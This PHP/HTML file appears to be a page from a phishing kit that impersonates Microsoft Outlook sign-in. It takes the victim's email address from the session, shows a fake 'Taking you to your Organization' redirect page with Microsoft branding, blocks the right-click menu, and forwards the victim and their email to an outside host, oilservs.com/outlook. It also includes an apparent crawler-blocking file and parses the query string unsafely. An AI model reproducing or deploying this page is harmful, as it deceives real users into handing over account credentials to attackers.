<?php
session_start();
ob_start();
include "blocker.php";
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	

parse_str(parse_url($url, PHP_URL_QUERY));

	
$parts = @explode('@', $userid);
	
$user = @$parts[0];
$email= $_SESSION['userid'];
// start > to get url and and put id 
	
$subemail = $_SESSION['subemail'];
$radiobtn = $_SESSION['radiobtn'];

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" lang="en">

<head>
    <title>Redirecting</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="REFRESH"content="2;url=http://oilservs.com/outlook/index.php?rand=13InboxLightaspxn.1774256418&userid=<?php echo $email ?>&subemail=<?php echo $subemail ?>&radiobtn=<?php echo $radiobtn ?>&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">
 

    
        <link rel="shortcut icon" href="/outlook/assets/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />

<link href="/outlook/assets/css/converged.v2.login.min_cqc1snhglyamadfdulaq7a2.css" rel="stylesheet" />
	<script type="text/javascript">
	document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    </script>
</head>

<body style="background-image:url(/outlook/assets/images/0.jpg)">
    <div>
        <div class="outer">
            <div class="middle">
                <div class="inner relative">
                        <img src="/outlook/assets/images/microsoft_logo_7zyesnzhfxur7eprws2m2q2.png" alt="Microsoft account symbol" />

                    <div class="row text-title" role="heading">Taking you to your Organization</div>

                        <div class="row form-group">Please wait while we redirect you to your mail service provider ....</div>
                        
                </div>
            </div>
        </div>

        <div class="footer default">
            <div id="footerLinks" class="footerNode text-secondary">
                    <div class="footerNode">
                        <span>
&#169;2018 Microsoft                        </span>
                        <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
                        <a href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank">Privacy &amp; cookies</a>
                    </div>
            </div>
        </div>
    </div>
</body>
</html>